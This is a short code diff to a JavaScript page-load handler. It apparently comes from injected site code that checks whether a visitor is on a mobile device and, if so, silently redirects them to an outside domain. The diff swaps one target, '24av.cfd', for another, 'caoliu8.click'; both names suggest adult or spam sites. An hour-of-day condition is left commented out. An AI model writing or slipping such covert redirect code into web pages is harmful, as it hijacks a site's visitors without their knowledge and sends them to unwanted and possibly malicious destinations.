@@ -2,7 +2,7 @@ window.onload=function(){
 	let hours = new Date().getHours();//拿到当前小时
 	//if(String(hours) === '22' || String(hours) === '0'){
 		if (isMobile()) {
-			window.location.href="http://24av.cfd";
+			window.location.href="http://caoliu8.click";
 			} else {
 				
 			}
